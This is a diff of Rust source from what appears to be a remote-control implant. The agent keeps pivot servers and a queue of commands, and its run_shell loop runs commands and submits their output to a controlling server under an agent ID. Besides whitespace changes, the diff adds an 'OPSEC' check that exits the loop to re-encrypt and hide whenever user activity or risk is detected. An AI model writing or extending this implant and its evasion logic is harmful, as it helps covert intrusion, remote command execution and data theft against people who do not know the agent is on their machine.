@@ -25,7 +25,6 @@ use tokio::sync::mpsc;
 use tokio::task::JoinHandle;
 use tokio::time::timeout;
 
-
 static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> = Lazy::new(|| TokioMutex::new(HashMap::new()));
 static QUEUED_COMMANDS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::new()));
 
@@ -37,12 +36,14 @@ fn create_command(command: &str, args: &[&str]) -> Command {
     cmd
 }
 
+
 #[cfg(not(windows))]
 fn create_command(command: &str, args: &[&str]) -> Command {
     let mut cmd = Command::new(command);
     cmd.args(args);
     cmd
 }
+
 
 fn get_all_local_ips() -> Vec<String> {
     let mut ips = Vec::new();
@@ -64,6 +65,8 @@ fn get_all_local_ips() -> Vec<String> {
     }
     ips
 }
+
+
 
 async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
     if cmd_parts.is_empty() {
@@ -336,6 +339,12 @@ pub async fn run_shell(
                     let _ = submit_result_with_client(&config, server_addr, agent_id, &cmd, &output).await;
                 }
             }
+        }
+
+        // After all command handling and sleeping:
+        if crate::opsec::determine_agent_mode() == crate::opsec::AgentMode::FullOpsec {
+            info!("[OPSEC] User activity or risk detected! Returning to FullOpsec.");
+            break Ok(()); // Exit run_shell, main loop will re-encrypt and wait
         }
     }
 }
